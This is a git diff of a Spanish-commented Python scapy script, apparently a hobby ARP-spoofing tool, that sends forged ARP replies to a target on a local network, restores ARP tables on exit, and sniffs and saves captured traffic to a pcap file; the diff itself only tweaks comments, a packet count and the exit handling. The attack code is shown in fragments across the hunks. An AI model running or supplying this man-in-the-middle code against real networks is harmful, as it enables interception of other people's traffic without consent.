@@ -1,6 +1,7 @@
 #!/usr/bin/python
 ## -*- coding: utf-8 -*-
 # Carlos Esteban Maccarrone -cem- 2018
+# To exit first Ctrl+C then Ctrl+Z
 
 from scapy.all import *
 import sys, time, threading, os, signal, logging.handlers
@@ -12,7 +13,7 @@ reg_.addHandler(registro_)
 
 def restaurar(ipDestino, macDestino, ipOrigen):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ipDestino,\
-                 hwsrc=macDestino, psrc=ipOrigen), count=5)
+                 hwsrc=macDestino, psrc=ipOrigen))
 
 def peticionARP(ipDestino, macDestino, ipOrigen):
     send(ARP(op=2, pdst=ipDestino, hwdst=macDestino, psrc=ipOrigen))
@@ -43,7 +44,7 @@ def registroEscuchar(paquete):
 def main():
     conf.verb = 0
     ipRouter = '192.168.1.1'
-    redesIP = '192.168.1.0/24'  #No tocar este campo porque crashea srp(), esperando actualizaciones. . . 
+    redesIP = '192.168.1.0/24' #No tocar este campo porque crashea srp(), esperamos actualizaciones . . . 
     conf.iface = 'wlp3s0'
 
     print "\n[++]Obtener MAC del router"
@@ -88,8 +89,5 @@ def main():
         paquetes = sniff(prn=registroEscuchar)
         wrpcap("capturas_.pcap", paquetes)
     except:
-        pass
+        sys.exit(0)
 main()
-
-
-# Cerrar --> Ctrl+C --> Ctrl+Z
